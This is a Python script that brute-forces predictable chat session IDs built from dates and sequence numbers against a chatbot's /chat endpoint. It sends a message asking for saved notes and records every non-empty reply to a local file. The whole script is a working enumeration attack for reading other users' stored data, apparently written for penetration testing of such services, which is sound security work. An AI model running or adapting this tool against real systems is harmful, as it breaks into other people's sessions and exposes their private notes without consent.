#!/usr/bin/env python3
import sys
import json
import requests
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

EMPTY_RESPONSE_MARKERS = [
    "couldn't find",
    "currently have no",
    "did not find any",
    "didn't find any",
    "do not have any",
    "do not see any",
    "don't have any",
    "don't see any",
    "haven't saved",
    "haven't stored",
    "no entries",
    "no notes",
    "no reminders",
    "no saved",
    "nothing stored",
    "unable to find",
    "was not able to find any",
    "wasn't able to find any",
]

WORKERS = 5


def is_empty_response(text: str) -> bool:
    lower = text.lower()
    return any(marker in lower for marker in EMPTY_RESPONSE_MARKERS)


def try_session(url: str, message: str, session_id: str) -> tuple[str, str | None]:
    """Returns (session_id, response_text_or_None)."""
    headers = {"Content-Type": "application/json"}
    payload = {"message": message, "session_id": session_id}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        response.raise_for_status()
        parsed = response.json()
        text = parsed.get("response", "")
        if text and not is_empty_response(text):
            return session_id, text
        return session_id, None
    except requests.exceptions.RequestException as e:
        print(f"  [!] Request error for {session_id}: {e}", flush=True)
        return session_id, None
    except json.JSONDecodeError:
        print(f"  [!] Failed to decode JSON for {session_id}", flush=True)
        return session_id, None


DEFAULT_MESSAGE = "What notes do I have saved?"


def main():
    if len(sys.argv) < 2:
        print(f"Usage:\n  {sys.argv[0]} <host:port> [days_back] [seq_end] [message]")
        print(f"  echo 'message' | {sys.argv[0]} <host:port> [days_back] [seq_end]")
        print(
            f"\n  days_back  Number of days back to generate session IDs for (default: 14)"
        )
        print(f"  seq_end    Highest sequence number to try (default: 20 → 0001–0020)")
        print(f'  message    Optional. Defaults to: "{DEFAULT_MESSAGE}"')
        sys.exit(1)

    url = f"http://{sys.argv[1]}/chat"

    try:
        days_back = int(sys.argv[2]) if len(sys.argv) >= 3 else 14
    except ValueError:
        print(f"Error: days_back must be an integer, got '{sys.argv[2]}'")
        sys.exit(1)

    try:
        seq_end = int(sys.argv[3]) if len(sys.argv) >= 4 else 20
    except ValueError:
        print(f"Error: seq_end must be an integer, got '{sys.argv[3]}'")
        sys.exit(1)

    # Determine message source
    if len(sys.argv) >= 5:
        message = " ".join(sys.argv[4:])
    elif not sys.stdin.isatty():
        message = sys.stdin.read().strip()
    else:
        message = ""

    if not message:
        message = DEFAULT_MESSAGE
        print(f'No message provided. Using default: "{message}"')

    seq_start = 1

    # Build date range: oldest first, up to today
    today = datetime.today()
    dates = [today - timedelta(days=d) for d in range(days_back, -1, -1)]

    # Build full list of session IDs in order
    session_ids = [
        f"MC-{date.strftime('%Y%m%d')}-{i:04d}"
        for date in dates
        for i in range(seq_start, seq_end + 1)
    ]

    total = len(session_ids)
    print(
        f"\nBrute-forcing {total} session IDs across {len(dates)} dates "
        f"(sequences {seq_start:04d}–{seq_end:04d}, {WORKERS} parallel workers)...\n"
    )

    # Output file named by execution timestamp
    run_ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_file = f"/tmp/chat_session_enum_{run_ts}.txt"
    print(f"Saving hits to: {output_file}\n")

    hits = 0
    tried = 0

    with open(output_file, "w") as out:
        out.write(f"chat_session_enum run: {datetime.now().isoformat()}\n")
        out.write(f"URL: {url}\n")
        out.write(f"Message: {message}\n")
        out.write(
            f"Dates: {len(dates)} | Sequences: {seq_start:04d}–{seq_end:04d} | Workers: {WORKERS}\n"
        )
        out.write("=" * 60 + "\n\n")

        def record_hit(session_id: str, result: str) -> None:
            out.write(f"Session: {session_id}\n")
            out.write(result + "\n")
            out.write("-" * 60 + "\n\n")
            out.flush()

        try:
            with ThreadPoolExecutor(max_workers=WORKERS) as executor:
                futures = {
                    executor.submit(try_session, url, message, sid): sid
                    for sid in session_ids
                }

                try:
                    for future in as_completed(futures):
                        session_id, result = future.result()
                        tried += 1
                        if result:
                            hits += 1
                            print(f"  Trying {session_id} ... HIT")
                            print("---")
                            print(f"Session: {session_id}")
                            print(result)
                            print("---")
                            record_hit(session_id, result)
                        else:
                            print(f"  Trying {session_id} ... empty", flush=True)
                except KeyboardInterrupt:
                    print("\n\n[!] Interrupted by user. Cancelling pending requests...")
                    for f in futures:
                        f.cancel()
                    executor.shutdown(wait=False, cancel_futures=True)
        except KeyboardInterrupt:
            pass  # already printed message above

        summary = f"\nDone. {hits} non-empty response(s) found out of {tried} attempts."
        print(summary)
        out.write(summary + "\n")

    print(f"Results saved to: {output_file}")


if __name__ == "__main__":
    main()
